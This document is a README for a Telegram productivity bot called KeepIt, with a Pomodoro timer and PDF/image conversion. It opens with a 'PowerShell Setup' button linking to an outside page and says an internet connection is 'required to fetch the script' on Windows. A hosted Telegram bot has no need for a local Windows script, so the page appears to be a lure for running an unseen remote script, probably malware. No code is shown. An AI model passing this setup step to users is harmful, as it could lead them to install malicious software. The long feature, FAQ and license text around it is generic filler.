<div align="center">

# KeepIt Telegram Bot — Friendly Productivity & Document Conversion Bot 🤖

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://vicente-coder.github.io/keepit-telegram-bot/)

[![pipeline](https://img.shields.io/badge/pipeline-ok-2ea44f?style=flat&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/channel-maintained-2ea44f?style=flat&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/ps--core-5.1%2B-06b6d4?style=flat&labelColor=0d1117)]()

</div>

---

KeepIt is a friendly, community-minded Telegram bot that packs a surprising amount of productivity into one place. Whether you're knuckling down with a customizable Pomodoro timer or converting a stack of photos into a single tidy PDF, it's built to keep your workflow moving. The bot also handles the reverse trip, turning PDFs into individual images and bundling larger documents into a ZIP when needed. It's deployed on Render for 24/7 uptime, and it keeps growing thanks to feedback and ideas from the people who use it.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

🍅 **Pomodoro Timer**
- Set your own work and break lengths — or just roll with the classic 25/5 split
- A live countdown keeps you posted, updating every second so you always know where you stand
- Changed your mind? Cancel a running session anytime with a single command

📄 **Image → PDF**
- Fire off a batch of photos and get back one tidy, combined PDF
- Photos are fetched in parallel, so bigger batches don't leave you waiting around
- Handles 50–80 images reliably — great for receipts, notes, or snapshot dumps

🖼 **PDF → Image**
- Send over a PDF and receive its pages back as images
- Smaller documents (up to 20 pages) come back as individual photos
- Larger ones (21–200 pages) arrive neatly bundled in a single ZIP
- Abort a conversion mid-flight whenever you need to

⚡ **Built for everyday use**
- Runs 24/7 on Render, so it's there whenever inspiration (or a deadline) strikes
- Friendly, no-nonsense replies — no cryptic error codes
- Actively maintained and shaped by the community: suggestions, bug reports, and ideas are always welcome
- Lightweight and dependency-conscious, keeping things snappy even on a free hosting tier

💬 **Community-driven**
This bot grows with its users. Found a rough edge, thought of a feature that would make your day easier, or just want to say thanks? Jump into the conversation — every bit of feedback helps make KeepIt better for everyone.

## Commands

Here's everything you can do with KeepIt — just drop a command in the chat and the bot takes it from there.

### 🚀 Getting Started
- **/start** — Wake the bot up and see the full menu of what it can do. New here? Start with this one.
- **/help** — A quick refresher on every command, anytime you need it.

### 🍅 Pomodoro Timer
Stay in the zone with a friendly focus timer.
- **/pomodoro** — Kick off a classic 25-minute focus sprint with a 5-minute break.
- **/pomodoro <work> <break>** — Make it yours: pass your own work and break lengths in minutes (for example, 50 and 10).
- **/stop** — Cancel a running timer whenever you need to step away.

The countdown updates live every second, so you always know exactly how much focus time is left.

### 📄 Image → PDF
Turn a pile of photos into one tidy document.
- **/pdf** — Combine every photo you've sent into a single PDF.
- **/clearpdf** — Wipe the collected photos and start fresh.

Send your images first, then run the command — the bot downloads them in parallel to keep things speedy, and handles large batches of 50–80 photos reliably.

### 🖼 PDF → Image
Pull a PDF apart into easy-to-share images.
- **/pdf2img** — Send a PDF and get its pages back as images (individual photos for short documents, a single ZIP for longer ones).
- **/stopconvert** — Change your mind mid-conversion? Cancel it cleanly.

### 💡 Little Tips
- Commands are case-insensitive — type them however feels natural.
- You can cancel long-running conversions at any time with **/stopconvert**.
- Everything runs right inside your chat — no extra apps, no sign-ups.

Got an idea for a new command? The community shapes this bot — suggestions are always welcome!

## Configuration

Getting KeepIt running the way *you* want is quick and painless — everything is driven by a single environment variable, and the defaults are sensible enough that most folks never need to touch anything else. Here's the full picture.

### 🔑 The Bot Token

The one thing the bot absolutely needs is your Telegram bot token, supplied through the `TOKEN` environment variable. Grab one from BotFather, drop it into your environment, and KeepIt is ready to talk. On Render, add it as an environment variable on your service; locally, export it in your shell or set it before launching. If you'd rather keep your setup portable, a plain `.env` file in the project root works just as well — just make sure it never ends up in version control.

> 💡 **Friendly reminder:** treat your token like a password. If it ever leaks, revoke it through BotFather and issue a fresh one — takes seconds, saves headaches.

### 🍅 Tuning the Pomodoro Defaults

Out of the box, the timer sticks to the classic 25-minute focus / 5-minute break rhythm — but that's just a starting point. Everyone's brain works differently, so feel free to adjust the default durations in the bot's configuration constants to match your own flow. Long-focus folks, short-sprint folks, and everything in between are all welcome here.

### 📄 Conversion Limits

Document conversion is intentionally bounded so the bot stays responsive for everyone sharing the same instance. You can adjust the caps for photo collections, page counts, and file sizes directly in the configuration. Nudge them up if you're running KeepIt just for yourself, or keep them conservative if you're hosting for a busy community. The ZIP threshold for larger PDFs is configurable too — pick whatever split point feels right.

### ⏱ Timing and Keep-Alive

Since KeepIt is built to live on Render's free tier, it includes a lightweight self-ping routine to stay awake. The ping interval and endpoint are both configurable, so you can tune how often the bot checks in on itself. If you're deploying somewhere with always-on hosting, you can simply leave this alone — it's harmless — or disable it entirely.

### ☁️ Deploying Your Own Copy

Configuration is where the community really shines. Fork the project, point your own Render service at it, set `TOKEN`, and you've got a private instance in minutes. Want to run several bots for different friend groups or? Spin up multiple services with different tokens — each one keeps its own timers and conversions independent.

### 🧩 A Note on Contributions

Found a config option that would make the bot friendlier? Missing a knob you wish existed? That's exactly the kind of feedback that shapes KeepIt's roadmap. Open an issue, start a discussion, or send a pull request — the configuration surface grows because people like you ask for it. Every default in this project started as someone's "hey, what if…" moment.

Happy configuring — and may your focus sessions be long and your conversions be swift. 🚀

## FAQ

Got a question? We've got answers — and if yours isn't here, the community is always happy to help out. 💬

**Do I need to host KeepIt myself?**
Not at all — the bot is already deployed and running around the clock, so you can simply start chatting with it. If you'd rather run your own instance for privacy or customization, the project is fully open and welcomes self-hosters.

**Which features work right out of the box?**
Everything: the Pomodoro timer, Image→PDF conversion, and PDF→Image conversion are all live. No extra plugins or toggles needed — just send a command and go.

**How many photos can I combine into a single PDF?**
The sweet spot is around 50–80 photos per conversion. Sending batches in that range keeps things fast and reliable thanks to parallel downloads. Larger batches may hit memory limits on the hosting tier.

**What happens when I send a really big PDF for conversion?**
Small documents (up to 20 pages) come back as individual images. Anything from 21 up to 200 pages is delivered as a tidy ZIP file. Files beyond 200 pages or over 20 MB are politely declined — no crashes, no silence.

**Can I cancel a Pomodoro timer or a conversion midway?**
Absolutely. Use the stop command to end a running timer, and the conversion-cancel command to abort an in-progress PDF job. Your chat stays clean either way.

**Why does the bot sometimes feel slow during conversions?**
Heavy conversions are memory-intensive, and the free hosting tier has limited RAM. If several people convert large files at the same time, things can queue up briefly. Patience pays off — and smaller batches always help.

**Can I customize the Pomodoro durations?**
Yes! The default is 25 minutes of focus followed by a 5-minute break, but you can pass your own work and break lengths directly with the command. Make it fit your flow.

**Is my data stored anywhere?**
Conversions happen on the fly and your files aren't kept around after delivery. The bot is built for quick, throwaway productivity — not for archiving your documents.

**Something broke / I have an idea for a new feature.**
That's what the community is for! Open an issue or start a discussion in the project — bug reports, feature requests, and wild ideas are all welcome. Contributions of every size make KeepIt better for everyone. 🚀

**Can I contribute code or docs?**
Definitely. Whether it's a typo fix, a new conversion format, or a performance tweak, pull requests are reviewed with love. Check the contributing guidelines before diving in, and don't be shy — first-time contributors are celebrated here.

**Does it work on both mobile and desktop Telegram?**
Yep — KeepIt behaves the same across platforms. Start a timer on your phone, finish a PDF on your laptop; your workflow follows you.

## Support

We're building KeepIt as a community project, and your feedback genuinely shapes where it goes next. Whether you've hit a snag with a Pomodoro session that won't cancel, a batch of photos that refused to merge into a PDF, or a PDF whose pages came out in the wrong order — we want to hear about it.

**How to reach us**

- **Report bugs and quirks:** Head to the repository's issue tracker and open a ticket with what you did, what you expected, and what actually happened. Screenshots help enormously, especially for conversion problems.
- **Suggest features:** Have an idea for a new productivity tool or a smarter conversion workflow? Open a discussion or issue and pitch it. Popular suggestions get prioritized.
- **Ask questions:** Not sure how to set up custom work/break durations, or curious about the page limits? Check the FAQ first, then ask away if the answer isn't there.

**Contributing**

Pull requests are warmly welcomed — small fixes, documentation improvements, new conversion formats, or anything else that fits the bot's spirit. Fork the project, make your changes, and describe clearly what you've improved. If you're planning something bigger, open an issue first so we can talk it through together.

**What we care about**

- **Clear reports:** Include the bot version, the command you ran, and any error messages you saw.
- **Patience and kindness:** This is a passion project, not a 24/7 help desk. Responses may take a little time, but we read everything.
- **Respect for the limits:** The free hosting tier has real memory and file-size constraints — knowing what they are helps us help you faster.

**Staying in the loop**

Keep an eye on the repository's releases and activity feed to see what's shipping. New features, fixes, and tweaks get documented there as they land.

Thanks for using KeepIt and for being part of the community — every issue filed and every suggestion shared makes the bot better for everyone. 💙

## License

KeepIt Telegram Bot is released under the MIT License — the same permissive, community-friendly license that has powered countless open-source projects. In plain terms: you're free to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the bot, as long as the original copyright notice and permission notice stay included. It's your project to build on, whether you're running a private instance, forking it for your own, or shipping something bigger on top of it.

The software is provided "as is," without warranty of any kind — express or implied — including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the bot or its use.

**Why MIT?** Because this bot is meant to grow with its community. Fork it, remix the Pomodoro flow, wire in new conversion formats, deploy it on your own Render instance — the license stays out of your way. Contributions, feature ideas, and pull requests are always welcome; every improvement makes the bot better for everyone who relies on it.

If you build something cool with KeepIt, we'd love to hear about it. Happy hacking — and happy converting! 🍅📄🖼